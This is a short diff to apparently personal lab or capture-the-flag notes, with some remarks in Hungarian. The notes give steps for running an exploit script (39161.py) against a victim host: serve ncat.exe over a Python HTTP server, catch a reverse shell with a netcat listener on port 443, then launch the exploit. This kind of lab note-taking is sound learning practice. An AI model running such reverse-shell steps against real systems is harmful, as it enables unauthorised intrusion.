@@ -14,6 +14,9 @@
 * $ python -m http.server 80
   * we need it so the exploit can upload the ncat.exe to the victim
   * if we want to change it we probably has to change the commands in the exploit as well (to the appropriate port that we gave to python)
-* $ nc -nvlp 443
-* $ python 39161.py 10.10.10.2 80
+* $ sudo nc -nvlp 443
+  * ha 443-at akarunk hasznalni, akkor kell a 'sudo' mindenkepp ele!!!!!
+  * ha masik portot akkor nem feltetlen (de akkor meg at kell irni azt az exploit-ban!!)
+* $ python2.7 39161.py 10.10.10.2 80
   * ip and port of victim machine
+  * python2.7-el mukodott csak (a tobbi python hibat dobott)
